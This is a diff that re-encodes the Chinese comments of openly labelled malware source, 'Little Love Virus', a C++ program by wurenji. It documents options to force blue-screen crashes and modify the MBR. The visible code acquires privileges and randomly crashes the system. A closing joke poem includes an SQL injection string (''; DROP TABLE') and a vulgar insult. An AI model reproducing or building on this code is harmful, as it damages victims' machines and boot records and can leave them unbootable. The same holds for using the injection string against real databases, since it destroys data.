@@ -1,4 +1,4 @@
-/*
+﻿/*
 Little Love Virus
 Yellow Eel special version
 By wurenji,2022
@@ -6,13 +6,14 @@ main:main.cpp
 The main virus.
 
 command:
-/c:����Ĳ���
-/r:��������
-/b:ֱ������
-/m:��MBR
-/e:ֱ���˳�
-/-b����������
-/-s����������
+/c:必须的参数
+/r:正常运行
+/b:直接蓝屏
+/m:改MBR
+/e:直接退出
+/-b：禁用蓝屏
+/-s：禁用声音
+
 */
 
 #define __BUILD__ 1
@@ -21,7 +22,7 @@ command:
 #include"func.h"
 #include"hide.h"
 
-//�Խ���ֹ����
+//自建中止函数
 void terminate_func()
 {
 	MakeBlueScreen(0xccccc513);
@@ -47,7 +48,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 		cmd__s = false;
 
 
-	//��ȡargv
+	//读取argv
 	cmd_c = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/c"))) != argv.end();
 	cmd_r = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/r"))) != argv.end();
 	cmd_b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/b"))) != argv.end();
@@ -57,7 +58,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 	cmd__s = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-s"))) != argv.end();
 
 	if (!cmd_c)
-		return 1;//�����ڲ�����
+		return 1;//不是内部调用
 
 	GetPrivileges();
 
@@ -94,7 +95,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 			if (!wfs.good())
 				iserror = true;
 		}
-		//�齱
+		//抽奖
 		if (rand() % 16 == 0 && !cmd__b)
 			iserror = MakeBlueScreen(0xCC232323) || iserror;
 		if (rand() % 16 == 0&&!cmd__s)
@@ -115,53 +116,53 @@ int _tmain(int argc, TCHAR* c_argv[])
 
 
 /*
-���ưɡ�
+《酒吧》
 
 wurenji
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��ơ��
+一个wurenji走进一家酒吧，要了一杯啤酒
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��ơ�ơ�
+一个wurenji走进一家酒吧，要了一杯啤酒·
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ������
+一个wurenji走进一家酒吧，要了一杯咖啡
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��0.7��ơ��
+一个wurenji走进一家酒吧，要了0.7杯啤酒
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��-1��ơ��
+一个wurenji走进一家酒吧，要了-1杯啤酒
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��2^64��ơ��
+一个wurenji走进一家酒吧，要了2^64杯啤酒
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��÷��֭
+一个wurenji走进一家酒吧，要了一杯梅素汁
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ������
+一个wurenji走进一家酒吧，要了一杯公鸡
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��""
+一个wurenji走进一家酒吧，要了一份""
 
-һ��wurenji�߽�һ�Ҿưɣ�ʲôҲûҪ
+一个wurenji走进一家酒吧，什么也没要
 
-һ��wurenji�߽�һ�Ҿưɣ����߳�ȥ�ִӴ��������ִӺ��ų�ȥ����ˮ�������
+一个wurenji走进一家酒吧，又走出去又从窗户进来又从后门出去从下水道钻进来
 
-һ��wurenji�߽�һ�Ҿưɣ����߳�ȥ�ֽ����ֳ�ȥ�ֽ����ֳ�ȥ�������������ϰ��������һ��
+一个wurenji走进一家酒吧，又走出去又进来又出去又进来又出去，最后在外面把老板朵拉打了一顿
 
-һ��wurenji�߽�һ//�Ҿưɣ�Ҫ��һ��ơ��
+一个wurenji走进一//家酒吧，要了一杯啤酒
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ�������̵���
+一个wurenji走进一家酒吧，要了一杯烫烫烫的锟斤拷
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��1/0��NULL
+一个wurenji走进一家酒吧，要了1/0杯NULL
 
-һ��wurenji���һ�Ҿưɣ�Ҫ��500��ơ��÷��֭�㾫������Ϻͷ
+一个wurenji冲进一家酒吧，要了500个啤酒梅素汁香精煎鱼蒸虾头
 
-һ��wurenji�Ѿưɲ���
+一个wurenji把酒吧拆了
 
-һ��wurenji��װ���ϰ�����߽�һ�Ҿưɣ�Ҫ��500��ơ�Ʋ��Ҳ���Ǯ
+一个wurenji化装成老板朵拉走进一家酒吧，要了500杯啤酒并且不付钱
 
-4.29�ڸ�wurenji�ھư������Х����
+4.29亿个wurenji在酒吧门外呼啸而过
 
-һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��ơ��';DROP TABLE �ư�
+一个wurenji走进一家酒吧，要了一杯啤酒';DROP TABLE 酒吧
 
-wurenji������뿪�˾ưɡ�
+wurenji满意地离开了酒吧。
 
-Ȼ��һ����������һ������̷����ư�ը�ˡ�
+然后一个黄鳝点了一份香翅捞饭，酒吧炸了。
 
-����ɵ�ƣ�����
+黄鳝傻逼！！！
 */
